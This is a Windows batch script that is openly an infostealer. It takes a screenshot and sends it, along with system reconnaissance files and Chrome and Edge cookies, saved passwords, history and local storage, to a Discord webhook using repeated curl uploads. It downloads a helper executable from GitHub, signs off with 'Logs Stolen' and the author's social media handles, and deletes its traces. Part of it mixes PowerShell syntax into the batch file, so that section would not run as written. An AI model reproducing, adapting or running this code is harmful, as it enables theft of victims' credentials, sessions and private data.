@echo off
timeout 2
cd %appdata%
set "webhook=https://discord.com/api/webhooks/your_webhook_here"

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```--------------------------------------------------------------------------```\"}" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```New Session !!```\"}" %webhook%



curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Screenshot from %ComputerName% @ %TIME%```\"}" %webhook%


curl --silent -L --fail "https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true" -o s.exe
.\s.exe -o %appdata%\s.png
curl --silent --output /dev/null -F ss=@"%appdata%\s.png" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```############# Device Info ############```\"}" %webhook%

$X="Basic-System-Information.txt","Environment-Variables.txt","Network-Information.txt","DNS-Servers.txt","ARP-cache.txt","Routing-Table.txt","Network-Connections.txt","Connected-Drives.txt","Firewall-Config.txt","Current-User.txt","User-Privileges.txt","Local-Users.txt","Logged-in-Users.txt","Credential-Manager.txt","User-Autologon-Registry-Items.txt","Local-Groups.txt","Local-Administrators.txt","User-Directories.txt","Searching-for-SAM-backup-files.txt","Running-Processes.txt","Installed-Software-Directories.txt","Software-in-Registry.txt","Folders-with-Everyone-Permissions.txt","Folders-with-BUILTIN-User-Permissions.txt","Checking-registry-for-AlwaysInstallElevated.txt","Scheduled-Tasks.txt","Startup-Commands.txt","Searching-for-files-with-passwords.txt","Searching-HKLM-for-passwords.txt","Searching-HKCU-for-passwords.txt"

foreach ($file in $X) {
    curl --silent --output /dev/null -F dir=@"%USERPROFILE%\WindowsPrograms\$file" %webhook%
}

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Google Chrome Logs --------```\"}" %webhook%

curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_cookie.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_extension.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_history.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_localstorage.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Chrome\chrome_default_password.json" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Microsoft Edge Logs --------```\"}" %webhook%

curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_bookmark.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_cookie.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_download.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_history.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_localstorage.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_default_password.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_user_1_extension.json" %webhook%
curl --silent --output /dev/null -F b=@"%USERPROFILE%\Results4HackedPC\Hacked-Browsers-Credintionals\Microsoft-Edge\microsoft_edge_user_1_localstorage.json" %webhook%

curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```-------- Sessions Done !! ... Logs Stolen 😈  Contact Me In Telegram: @HexBuddy127001  My Instagram: hex_buddy ---------```\"}" %webhook%


del %appdata%\s.exe
del %appdata%\s.png
del %appdata%\sysinfo.txt
del %appdata%\netuser.txt
del %appdata%\dir.txt
del %appdata%\ipconfig.txt
del %appdata%\whoami.txt
del Results4HackedPC.zip
del Results4HackedPC
pause
